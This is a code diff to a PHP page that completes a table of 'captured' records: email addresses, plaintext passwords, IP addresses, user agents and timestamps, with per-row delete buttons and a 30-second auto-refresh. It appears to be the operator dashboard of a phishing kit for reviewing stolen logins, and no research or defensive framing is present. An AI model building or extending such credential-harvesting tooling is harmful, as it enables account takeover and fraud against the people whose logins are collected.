@@ -399,4 +399,31 @@ if (file_exists($dataFile)) {
                                     <td><?php echo count($capturedData) - $index; ?></td>
                                     <td><?php echo htmlspecialchars($data['email'] ?? 'N/A'); ?></td>
                                     <td class="password-text"><?php echo htmlspecialchars($data['password'] ?? 'N/A'); ?></td>
-                                    <td><span class="ip-badge"><?php echo htmlspecialchars($data['ip
+                                    <td><span class="ip-badge"><?php echo htmlspecialchars($data['ip_address'] ?? 'N/A'); ?></span></td>
+                                    <td><small><?php echo htmlspecialchars(substr($data['userAgent'] ?? 'N/A', 0, 60)); ?>...</small></td>
+                                    <td><?php echo htmlspecialchars($data['server_time'] ?? $data['timestamp'] ?? 'N/A'); ?></td>
+                                    <td>
+                                        <form method="POST" style="display: inline;">
+                                            <input type="hidden" name="delete_id" value="<?php echo count($capturedData) - $index - 1; ?>">
+                                            <button type="submit" class="delete-btn">
+                                                <i class="fas fa-trash"></i>
+                                            </button>
+                                        </form>
+                                    </td>
+                                </tr>
+                            <?php endforeach; ?>
+                        </tbody>
+                    </table>
+                <?php endif; ?>
+            </div>
+        </div>
+    <?php endif; ?>
+
+    <script>
+        // Auto-refresh every 30 seconds
+        setTimeout(function() {
+            location.reload();
+        }, 30000);
+    </script>
+</body>
+</html>
